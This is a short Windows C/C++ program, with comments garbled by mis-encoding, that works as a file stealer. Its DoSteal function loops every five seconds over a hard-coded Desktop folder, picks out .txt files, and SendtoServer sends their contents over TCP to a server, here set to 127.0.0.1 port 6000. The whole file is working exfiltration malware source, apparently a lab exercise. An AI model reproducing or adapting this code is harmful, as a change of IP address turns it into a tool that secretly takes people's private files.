#define _CRT_SECURE_NO_WARNINGS

#include<stdio.h>
#include<windows.h>
#include<iostream>

#pragma comment(lib, "ws2_32.lib")

int SendtoServer(const char* path)
{
	// 1.��ʼ�������
	//   1).�����׽��ֿ�
	WORD wVersionRequested;
	WSADATA wsadata;
	int err;
	char sendBuf[1024] = { 0 };

	wVersionRequested = MAKEWORD(2, 2);

	//	 2).��ʼ���׽��ֿ�
	err = WSAStartup(wVersionRequested, &wsadata);
	if (err != 0)
	{
		printf("WSAStartup errorNum = %d\n", GetLastError());
		system("pause");
		return err;
	}
	if (LOBYTE(wsadata.wVersion) != 2 || HIBYTE(wsadata.wVersion) != 2)
	{
		printf("LOBYTE errorNum = %d\n", GetLastError());
		WSACleanup();
		system("pause");
		return -1;
	}

	// 2.��װ�绰��
	//   1).�½��׽���
	SOCKET sockCli = socket(AF_INET, SOCK_STREAM, 0);
	if (INVALID_SOCKET == sockCli)
	{
		printf("socket errorNum = %d\n", GetLastError());
		system("pause");
		return -1;
	}

	//	 2).����Ҫ���ӵķ�����
	SOCKADDR_IN addrSrv;
	addrSrv.sin_addr.S_un.S_addr = inet_addr("127.0.0.1"); // ���ñ���IP��ַ ����������� ��Ϊ10060
	addrSrv.sin_family = AF_INET;
	addrSrv.sin_port = htons(6000); // ���ñ����˿ں� ����������� ��Ϊ10061

	// 3.���ӷ�����
	if (SOCKET_ERROR == connect(sockCli, (SOCKADDR*)&addrSrv, sizeof(SOCKADDR)))
	{
		printf("connect errorNum = %d\n", GetLastError());
		system("pause");
		return -1;
	}
	
	// 4. ��ȡ�ļ�����
	FILE* fp = fopen(path, "rb"); // ��ֻ���ķ�ʽ��ȡ�ļ�
	int len = fread(sendBuf, 1, 1024, fp); // ��fp��ָ����ļ��е����ݶ�ȡ1024��С�����ݵ�sendBuf����
	fclose(fp); // �ر��ļ����
	// 5. ��������
	int iLen = send(sockCli, sendBuf, strlen(sendBuf) + 1, 0);
	if (iLen < 0)
	{
		printf("send errorNum = %d\n", GetLastError());
		system("pause");
		return -1;
	}

	//5. �ر��׽�������
	closesocket(sockCli);
	WSACleanup();
	return 0;
}

int DoSteal(const char* szPath)
{
	// 1.  ����szPath�µ������ļ�
	WIN32_FIND_DATA FindFileData; // FindFileData��ʾһ���ļ�
	HANDLE hListFile; // �ļ��þ������ʶ�� ����һ�����

	char szFilePath[MAX_PATH] = { 0 }; // MAX_PATH Ĭ��ֵ��260
	strcpy(szFilePath, szPath); // �����ļ���
	strcat(szFilePath, "\\*"); // ʹ��ͨ�����ƥ����ļ��������е��ļ�
	// 2.  �����ҵ���һ���ļ�,���������ľ�����ڱ�ʾ����ļ�
	hListFile = FindFirstFile(szFilePath, &FindFileData); // ����->��������->�߼�->�߼�����->�ַ���->ʹ��Unicode�ַ���
	// 3.  ѭ�����������ļ�
	do
	{
		char mypath[MAX_PATH] = { 0 };
		strcpy(mypath, szPath); // �����ļ�·��
		strcat(mypath, FindFileData.cFileName); // ��·�����渽���ļ����� ����cFileName���Կ��Եõ��ļ���
		if (strstr(mypath, ".txt")) // �����.txt�ļ�
		{
			// ������ʼ��ȡ�ļ�
			SendtoServer(mypath); // ���õ����ļ����͵���������
			printf("mypath = %s\n", mypath); // ��ӡ����ǰ·���������ļ�����
		}
	} while (FindNextFile(hListFile, &FindFileData)); //  FindFileData��ʾ���ҵ����ļ�����Ϣ
	return 0;
}

int main()
{
	printf("Steal\n");
	// ��ȡ�ļ� ("��ȡ��һ���ļ��أ�")
	while(1)
	{
		DoSteal("C:\\Users\\20613\\Desktop\\test\\"); //������Ҫ�������һ���ļ��е�·��,��������������"\\"
		Sleep(5000);
	}
	// next �� �ڶ���
	system("pause");
	return 0;
}